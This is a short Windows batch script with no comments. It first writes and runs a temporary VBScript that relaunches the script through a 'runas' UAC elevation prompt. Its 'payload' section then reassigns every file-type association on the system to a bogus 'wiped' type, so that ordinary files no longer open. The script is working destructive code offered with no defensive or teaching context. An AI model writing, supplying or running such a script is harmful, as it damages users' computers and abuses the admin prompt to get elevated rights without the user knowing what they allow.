if _%1_==_payload_  goto :payload

:getadmin
    set vbs=%temp%\getadmin.vbs
    echo Set UAC = CreateObject^("Shell.Application"^)                >> "%vbs%"
    echo UAC.ShellExecute "%~s0", "payload %~sdp0 %*", "", "runas", 1 >> "%vbs%"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
goto :eof

:payload
    for /f "delims==" %%a in ('assoc') do (assoc %%a=wiped & ftype wiped=wiped.bat)
goto :eof
